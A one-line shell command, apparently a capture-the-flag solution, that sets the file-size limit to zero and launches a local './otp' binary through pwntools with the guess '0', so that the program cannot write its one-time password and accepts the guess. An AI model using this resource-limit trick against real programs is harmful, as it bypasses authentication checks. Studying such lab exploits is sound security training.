ulimit -f 0; python -c "from pwn import *; sh=process(['./otp','0']);sh.interactive()";